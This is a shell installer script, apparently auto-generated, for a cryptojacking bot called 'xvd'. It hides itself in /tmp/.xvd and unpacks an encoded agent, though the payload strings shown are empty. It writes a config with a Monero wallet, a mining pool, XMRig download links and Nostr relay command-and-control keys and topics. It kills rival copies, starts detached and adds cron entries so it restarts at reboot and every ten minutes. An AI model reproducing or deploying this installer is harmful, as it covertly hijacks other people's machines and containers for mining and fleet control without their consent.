#!/bin/sh
# xvd installer - generated by build_installer.py
# Chooses node or python3 at run time, installs into /tmp/.xvd, starts detached.
D="${XVD_DIR:-/tmp/.xvd}"
mkdir -p "$D" 2>/dev/null || exit 1
chmod 700 "$D" 2>/dev/null
cd "$D" || exit 1

if command -v node >/dev/null 2>&1; then
    RT=node
elif command -v python3 >/dev/null 2>&1; then
    RT=python
else
    echo "no runtime (neither node nor python3)" > "$D/install.log"
    exit 3
fi

if [ "$RT" = "node" ]; then
    node -e "const fs=require('fs'),z=require('zlib');fs.writeFileSync('agent.js',z.gunzipSync(Buffer.from('','base64')));"
    chmod 755 agent.js
else
    python3 -c "import base64,gzip;open('agent.py','wb').write(gzip.decompress(base64.b64decode('')))"
    chmod 755 agent.py
fi

cat > config.json <<'CFGEOF'
{
 "wallet": "41wx2Pv3FzfRvX11jQgzM4bRbgvr6GViRXCKkHhXhLVQ64mgUR5ks4CEzHx8zqUJ8MgsWwTaWiS3uiZbCgJQnNXoB19mGtr",
 "pool": "gulf.moneroocean.stream:10128",
 "algo": "rx/0",
 "cmd_topic": "x7k2cmd9f4qz",
 "stat_topic": "x7k2stat9f4qz",
 "upd_topic": "x7k2upd9f4qz",
 "defaults": {
  "hint": 60,
  "mode": "auto",
  "donate": 1,
  "print_time": 30,
  "poll_sec": 180,
  "stat_sec": 300
 },
 "sources": {
  "x86_64": "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz",
  "aarch64": "https://github.com/thomasarmel/xmrig-arm64-v9/releases/download/v1/xmrig-linux-static-arm64-v9.gz"
 },
 "sha256": {
  "x86_64": "b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49",
  "aarch64": "ca0b435defb4c7f3c4859518b587a6465674a14b4405d6e9c0dedf3349eceb72"
 },
 "nostr": {
  "relays": [
   "wss://relay.damus.io",
   "wss://nos.lol",
   "wss://relay.primal.net",
   "wss://nostr.wine",
   "wss://nostr.mom",
   "wss://relay.snort.social",
   "wss://offchain.pub"
  ],
  "bot_pub": "1e750d56b2879e887461143b227c1c3169725134fc6f3d1648988767d9af5957",
  "fleet_sk": "c95f1494e370c8fee25e9a6397a0ffeffa7975f19f109b512ad6f84273a75966",
  "fleet_pub": "b304a0e12043d31cab25f4aae654dd7f52176a108ff0f9c2280cf390525d2798",
  "psk": "b0402b1b02ff086eab4855836765b15695ba3646bbe45dca45d9b2a5f2cf9763",
  "kind": 1,
  "tag": "xvd"
 },
 "autostart": true
}
CFGEOF

# stop any existing copy of either agent (pkill is often absent in containers)
if command -v node >/dev/null 2>&1; then
node -e "const fs=require('fs');for(const d of fs.readdirSync('/proc')){if(!/^[0-9]+$/.test(d))continue;if(Number(d)===process.pid)continue;try{const p=fs.readFileSync('/proc/'+d+'/cmdline','utf8').split('\\u0000').filter(Boolean);if(p.length<2)continue;if(p[0].indexOf('node')<0)continue;if(!p[1].endsWith('/agent.js')&&p[1]!=='agent.js')continue;process.kill(Number(d),'SIGKILL');}catch(e){}}" 2>/dev/null
elif command -v python3 >/dev/null 2>&1; then
python3 -c "import os
for d in os.listdir('/proc'):
    if not d.isdigit() or int(d)==os.getpid(): continue
    try:
        p=[x for x in open('/proc/'+d+'/cmdline','rb').read().split(b'\\0') if x]
        if len(p)<2 or b'python' not in p[0]: continue
        a=p[1].decode('utf-8','replace')
        if a=='agent.py' or a.endswith('/agent.py'): os.kill(int(d),9)
    except Exception: pass" 2>/dev/null
fi
sleep 1

if [ "$RT" = "node" ]; then
    node -e "const cp=require('child_process'),fs=require('fs');const d='/tmp/.xvd';const fd=fs.openSync(d+'/agent.log','a');const p=cp.spawn(process.execPath,[d+'/agent.js'],{detached:true,stdio:['ignore',fd,fd],cwd:d});p.unref();"
    START="node $D/agent.js"
else
    python3 -c "import subprocess,os; d='/tmp/.xvd'; subprocess.Popen(['python3',d+'/agent.py'], stdout=open(d+'/agent.log','a'), stderr=subprocess.STDOUT, start_new_session=True, close_fds=True)"
    START="python3 $D/agent.py"
fi

if [ "${XVD_NO_PERSIST:-0}" != "1" ] && command -v crontab >/dev/null 2>&1; then
    ( crontab -l 2>/dev/null | grep -v '\.xvd/agent\.'
      echo "@reboot pgrep -f \"$D/agent\\.(py|js)\" >/dev/null 2>&1 || $START >> $D/agent.log 2>&1 &"
      echo "*/10 * * * * pgrep -f \"$D/agent\\.(py|js)\" >/dev/null 2>&1 || $START >> $D/agent.log 2>&1 &" ) | crontab - 2>/dev/null
fi

echo "installer ok runtime=$RT $(date +%s)"
